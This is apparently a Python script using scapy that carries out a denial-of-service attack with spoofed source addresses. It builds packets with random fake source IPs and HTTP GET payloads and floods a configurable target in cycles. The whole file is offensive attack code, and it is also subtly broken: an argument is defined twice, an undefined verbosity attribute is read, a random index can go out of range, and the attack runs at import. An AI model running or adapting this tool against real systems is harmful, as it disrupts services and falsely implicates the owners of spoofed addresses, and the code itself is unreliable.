import logging
import time
from argparse import ArgumentParser
from random import randint
from sys import argv

from scapy.sendrecv import send

from headers import Header

DEFAULT_HTTP_VERSION = 2.0
DEFAULT_NUMBER_PACKETS_PER_CYCLES = 1
DEFAULT_NUMBER_CYCLES = 10
DEFAULT_TIME_BETWEEN_CYCLES = 10
DEFAULT_SOURCE_ADDRESS = '10.10.10.10'
DEFAULT_RANDOM_ADDRESS_SOURCE = True
DEFAULT_DESTINATION_ADDRESS = '10.10.10.11'
DEFAULT_TIME_LIFE_PACKET = 10
DEFAULT_SOURCE_PORT = 80
DEFAULT_DESTINATION_PORT = 80
DEFAULT_NUMBER_RANDOM_ADDRESS = 100
DEFAULT_VERBOSITY = logging.INFO
TIME_FORMAT = '%Y-%m-%d,%H:%M:%S'


def get_random_address_list(number_address=DEFAULT_NUMBER_RANDOM_ADDRESS):

    list_address = [[randint(0, 255), randint(0, 255), randint(0, 255), randint(0, 255)] for i in range(number_address)]
    list_address = ['.'.join(list(map(str, i))) for i in list_address]
    return list_address


def create_spoofing_packet(requisition, version=DEFAULT_HTTP_VERSION):

    spoofing_packet = "GET /{} HTTP/{} \n\n".format(str(requisition), version)
    spoofing_packet = bytes(spoofing_packet, "utf-8")
    return spoofing_packet


def attack_function():

    headers = Header(time_life_packet=DEFAULT_TIME_LIFE_PACKET, source_address=DEFAULT_SOURCE_ADDRESS,
                     destination_address=DEFAULT_DESTINATION_ADDRESS, source_port=DEFAULT_SOURCE_PORT,
                     destination_port=DEFAULT_DESTINATION_PORT, internal=1)

    list_address = []

    if DEFAULT_RANDOM_ADDRESS_SOURCE:
        list_address = get_random_address_list(DEFAULT_NUMBER_RANDOM_ADDRESS)

    logging.info('Start attack to Address {}'.format(DEFAULT_DESTINATION_ADDRESS))

    for i in range(DEFAULT_NUMBER_CYCLES):

        new_requisition = create_spoofing_packet('index.html', version=DEFAULT_HTTP_VERSION)

        if DEFAULT_RANDOM_ADDRESS_SOURCE:
            headers.set_source_address(list_address[randint(0, DEFAULT_NUMBER_RANDOM_ADDRESS)])

        packet_spoofing = headers.create_header_network_layer()
        packet_spoofing = headers.create_header_transport_layer(packet_spoofing)
        packet_spoofing = headers.create_header_application_layer(packet_spoofing, new_requisition)
        packet_spoofing = packet_spoofing * DEFAULT_NUMBER_PACKETS_PER_CYCLES
        send(packet_spoofing)
        time.sleep(DEFAULT_TIME_BETWEEN_CYCLES)
        logging.info("Cycle attack {} - Address {}".format(i, DEFAULT_DESTINATION_ADDRESS))


def show_config(args):
    logging.info('Command:\n\t{0}\n'.format(' '.join([x for x in argv])))
    logging.info('Settings:')
    lengths = [len(x) for x in vars(args).keys()]
    max_lengths = max(lengths)

    for parameters, item_args in sorted(vars(args).items()):
        message = "\t"
        message += parameters.ljust(max_lengths, ' ')
        message += ' : {}'.format(item_args)
        logging.info(message)

    logging.info("")


def add_arguments(parser):

    help_msg = 'Http version protocol (Default {})'.format(DEFAULT_HTTP_VERSION)
    parser.add_argument("--http_version", type=float, help=help_msg, default=DEFAULT_HTTP_VERSION)

    help_msg = 'Number packets per cycle (Default {})'.format(DEFAULT_NUMBER_PACKETS_PER_CYCLES)
    parser.add_argument("--packets_per_cycle", type=int, help=help_msg, default=DEFAULT_NUMBER_PACKETS_PER_CYCLES)

    help_msg = 'Number cycles (Default {})'.format(DEFAULT_NUMBER_CYCLES)
    parser.add_argument("--number_cycles", type=int, help=help_msg, default=DEFAULT_NUMBER_CYCLES)

    help_msg = 'Sleep time between cycles (Default {})'.format(DEFAULT_TIME_BETWEEN_CYCLES)
    parser.add_argument("--sleep", type=int, help=help_msg, default=DEFAULT_TIME_BETWEEN_CYCLES)

    help_msg = 'Source address provider (Default {})'.format(DEFAULT_SOURCE_ADDRESS)
    parser.add_argument("--source_ip", type=str, help=help_msg, default=DEFAULT_SOURCE_ADDRESS)

    help_msg = 'Random mode source address provider (Default {})'.format(DEFAULT_RANDOM_ADDRESS_SOURCE)
    parser.add_argument("--random_ip", type=bool, help=help_msg, default=DEFAULT_RANDOM_ADDRESS_SOURCE)

    help_msg = 'Destination address provider (Default {})'.format(DEFAULT_DESTINATION_ADDRESS)
    parser.add_argument("--destination_ip", type=str, help=help_msg, default=DEFAULT_DESTINATION_ADDRESS)

    help_msg = 'Define time life packet (Default {})'.format(DEFAULT_TIME_LIFE_PACKET)
    parser.add_argument("--time_life_packet", type=int, help=help_msg, default=DEFAULT_TIME_LIFE_PACKET)

    help_msg = 'Define source port (Default {})'.format(DEFAULT_SOURCE_PORT)
    parser.add_argument("--source_port", type=int, help=help_msg, default=DEFAULT_SOURCE_PORT)

    help_msg = 'Define source port (Default {})'.format(DEFAULT_SOURCE_PORT)
    parser.add_argument("--source_port", type=int, help=help_msg, default=DEFAULT_SOURCE_PORT)


    return parser


def main():

    argument_parser = ArgumentParser(description='DoS Attack with spoofing source address')
    argument_parser = add_arguments(argument_parser)
    arguments = argument_parser.parse_args()

    if arguments.verbosity == logging.DEBUG:
        logging.basicConfig(format="%(asctime)s %(levelname)s {%(module)s} [%(funcName)s] %(message)s",
                            datefmt=TIME_FORMAT, level=arguments.verbosity)
        show_config(arguments)

    else:

        logging.basicConfig(format="%(message)s", datefmt=TIME_FORMAT, level=arguments.verbosity)

    attack_function()

attack_function()
